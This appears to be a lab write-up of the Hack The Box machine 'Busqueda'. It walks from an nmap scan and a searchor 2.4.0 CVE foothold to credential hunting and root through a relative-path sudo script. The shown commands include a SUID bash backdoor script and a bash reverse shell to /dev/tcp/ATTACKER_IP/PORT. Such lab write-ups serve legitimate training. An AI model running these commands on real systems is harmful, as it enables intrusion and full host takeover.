---
title: "Busqueda Writeup"
date: 2026-01-08T11:57:00
description: Busqueda Writeup
menu:
  sidebar:
    name: Busqueda
    identifier: busqueda
    weight: 40
mermaid: true
---

# Services Scan

Nmap scan show that port 22(ssh) and 80(http) are open.

```bash title:"busqueda.nmap"
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.1
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://searcher.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
```

Add `searcher.htb`, that I found it on Nmap Logs to `etc/hosts`.

# Attacking HTTP(80)

Scope:

- `*.searcher.htb`

## Banner Grabbing

At footer of the page show that it use `flask` and `searchor 2.4.0`. By Googling, I found **CVE-2023-43364** on `searchor 2.4.0`.

## Foothold Shell as `svc`

I use public [POC](https://github.com/nexis-nexis/Searchor-2.4.0-POC-Exploit-) and get a shell as user,`svc`. First thing I do here is stabilize our shell using this technique [[Shell & Payloads#Stabilize Linux Shell#Using Python|Upgrade Shell]].

## Credential Hunting

There is interesting file found on `/var/www/app/.git/config` that point to another domain called `gitea.searcher.htb` with _cody:passxxx_ format.

### Credential Checking

Using `nxc ssh` and it show that password is working with _svc:passxxx_

## Abuse `Sudo`

`sudo -l` show that `svc` can run as `root` on specific python script. Analyzing that script seem to be like wrapper for docker ps, docker inspect and custom function, full-checkup. This box also had docker container called `gitea`. So, I will extract data using docker inspect.

```bash
/usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' gitea
```

there is hardcoded credential found and it is valid on `gitea.searcher.htb` as `administrator`.

## Credential Hunting

There is source code of `system-checkup.py` on `gitea.searcher.htb` while entering with user,`administrator` . Analyzing the source code found that full-checkup use a script called `full-checkup.sh` and it is not used safe url path and it use `"./full-checkup.sh"` on code. So, I can do path injection why creating a file called `full-checkup.sh` on current directory.

# Privilege Escalation

There are two ways to get `root` on this case.

## Craft & Abuse SUID

Due to this script run as `root`, I can copy `bash` and set SUID on that `bash` file and use it as follow:

```bash title:"full-checkups.sh"
#!/bin/bash

cp /bin/bash /tmp/bash
chown root:root /tmp/bash
chmod 4755 /tmp/bash
```

Run the `system-checkup.py` as root again. Then there will be `bash` on `/tmp` dir and use that crafted file, `/tmp/bash -p` and get a `root`.

## Reverse Shell as `root`

Let craft reverse shell payload using [Reverse Shell Generator](https://www.revshells.com/)

```bash title:"full-checkup.sh"
#! /bin/bash

/bin/bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
```

Setup Listener using `nc -lvnp PORT` then run the `system-checkup.py` as root again. Bomb! I got a `root` shell.

> [!tip]
> I personally prefer the first method that abuse SID.
